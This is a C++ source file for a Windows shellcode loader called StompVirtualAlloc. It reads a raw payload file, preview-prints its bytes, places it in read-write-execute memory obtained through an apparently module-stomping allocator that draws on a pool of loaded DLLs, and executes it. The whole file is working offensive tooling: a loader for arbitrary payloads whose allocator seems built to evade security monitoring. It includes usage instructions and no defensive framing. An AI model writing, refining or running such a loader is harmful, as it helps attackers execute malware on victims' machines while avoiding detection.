#include <iostream>
#include <fstream>
#include <vector>
#include <Windows.h>
#include "MyVirtualAlloc.h"

using namespace std;

// Load Shellcode from file
bool LoadShellcodeFromFile(const char* filePath, vector<unsigned char>& buffer) {
    ifstream file(filePath, ios::binary | ios::ate);
    
    if (!file.is_open()) {
        cout << "[ERROR] Unable to open file: " << filePath << endl;
        return false;
    }
    
    // Get file size
    streamsize fileSize = file.tellg();
    if (fileSize <= 0) {
        cout << "[ERROR] File is empty or invalid" << endl;
        file.close();
        return false;
    }
    
    cout << "[INFO] File size: " << fileSize << " bytes" << endl;
    
    // Return to beginning of file
    file.seekg(0, ios::beg);
    
    // Read file content
    buffer.resize(fileSize);
    if (!file.read((char*)buffer.data(), fileSize)) {
        cout << "[ERROR] Failed to read file" << endl;
        file.close();
        return false;
    }
    
    file.close();
    cout << "[SUCCESS] Shellcode file loaded successfully" << endl;
    return true;
}

// Display usage instructions
void ShowUsage(const char* programName) {
    cout << "========== StompVirtualAlloc Shellcode Loader ==========" << endl;
    cout << "Using StompVirtualAlloc as a replacement for VirtualAlloc\n" << endl;
    cout << "Usage:" << endl;
    cout << "  " << programName << " <shellcode_file_path>\n" << endl;
    cout << "Examples:" << endl;
    cout << "  " << programName << " shellcode.bin" << endl;
    cout << "  " << programName << " payload.raw" << endl;
    cout << "  " << programName << " C:\\test\\msgbox.bin\n" << endl;
    cout << "Notes:" << endl;
    cout << "  - Shellcode file should be in raw binary format" << endl;
    cout << "  - File size should not exceed available memory pool capacity" << endl;
    cout << "  - Ensure Shellcode is compiled for x64 (if on x64 system)" << endl;
}

// Display first few bytes of Shellcode (for debugging)
void ShowShellcodePreview(const vector<unsigned char>& shellcode, size_t previewSize = 32) {
    cout << "\n[PREVIEW] First " << min(previewSize, shellcode.size()) << " bytes of Shellcode:" << endl;
    cout << "  ";
    
    for (size_t i = 0; i < min(previewSize, shellcode.size()); i++) {
        printf("%02X ", shellcode[i]);
        if ((i + 1) % 16 == 0 && i < min(previewSize, shellcode.size()) - 1) {
            cout << "\n  ";
        }
    }
    cout << endl;
}

int main(int argc, char* argv[]) {
    // Set console to UTF-8 encoding
    SetConsoleOutputCP(CP_UTF8);
    
    // Check command line arguments
    if (argc < 2) {
        ShowUsage(argv[0]);
        cout << "\nPress any key to exit..." << endl;
        getchar();
        return 1;
    }
    
    const char* shellcodePath = argv[1];
    
    cout << "========== StompVirtualAlloc Shellcode Loader ==========" << endl;
    cout << "Using StompVirtualAlloc as a replacement for VirtualAlloc\n" << endl;
    
    // Step 1: Read Shellcode file
    cout << "[Step 1] Loading Shellcode from file..." << endl;
    cout << "[INFO] File path: " << shellcodePath << endl;
    
    vector<unsigned char> shellcode;
    if (!LoadShellcodeFromFile(shellcodePath, shellcode)) {
        cout << "\n[FAILED] Shellcode loading failed" << endl;
        cout << "Press any key to exit..." << endl;
        getchar();
        return -1;
    }
    
    size_t shellcodeSize = shellcode.size();
    
    // Display Shellcode preview
    ShowShellcodePreview(shellcode);
    
    // Step 2: Allocate executable memory using StompVirtualAlloc
    cout << "\n[Step 2] Allocating memory using StompVirtualAlloc..." << endl;
    cout << "[INFO] Requested size: " << shellcodeSize << " bytes" << endl;
    
    LPVOID execMemory = StompVirtualAlloc(
        NULL,                       // lpAddress - Address chosen by system
        shellcodeSize,              // dwSize - Number of bytes to allocate
        MEM_COMMIT | MEM_RESERVE,   // flAllocationType - Allocation type
        PAGE_EXECUTE_READWRITE      // flProtect - Read-write-execute
    );
    
    if (execMemory == NULL) {
        cout << "[ERROR] Memory allocation failed!" << endl;
        cout << "Possible reasons:" << endl;
        cout << "  - Initialization failed" << endl;
        cout << "  - DLL pool space insufficient" << endl;
        cout << "  - Unable to load candidate DLLs" << endl;
        cout << "\nPress any key to exit..." << endl;
        getchar();
        return -1;
    }
    
    cout << "[SUCCESS] Memory allocation successful" << endl;
    cout << "[INFO] Memory address: " << hex << execMemory << dec << endl;
    
    // Step 3: Copy Shellcode to allocated memory
    cout << "\n[Step 3] Copying Shellcode to memory..." << endl;
    memcpy(execMemory, shellcode.data(), shellcodeSize);
    cout << "[SUCCESS] Shellcode copied to address " << hex << execMemory << dec << endl;
    
    // Step 4: Execute Shellcode
    cout << "\n[Step 4] Executing Shellcode..." << endl;
    cout << "[WARNING] About to execute Shellcode!" << endl;
    cout << "[WARNING] If Shellcode has issues, program may crash" << endl;
    cout << "[WARNING] Make sure you trust this Shellcode file" << endl;
    cout << "\nPress any key to continue execution, or press Ctrl+C to cancel..." << endl;
    getchar();
    
    // Convert memory address to function pointer and call it
    typedef void (*ShellcodeFunc)();
    ShellcodeFunc executeShellcode = (ShellcodeFunc)execMemory;
    
    cout << "[EXECUTING] Running Shellcode..." << endl;
    
    // Execute Shellcode (Note: If shellcode has issues, program may crash)
    executeShellcode();
    
    cout << "\n[SUCCESS] Shellcode execution completed" << endl;
    
    // Step 5: Clean up memory
    cout << "\n[Step 5] Freeing memory..." << endl;
    if (StompVirtualFree(execMemory, 0, MEM_RELEASE)) {
        cout << "[SUCCESS] Memory freed" << endl;
    } else {
        cout << "[WARNING] Memory free failed" << endl;
    }
    
    cout << "\n========== Program Completed ==========" << endl;
    cout << "Press any key to exit..." << endl;
    getchar();
    
    return 0;
}
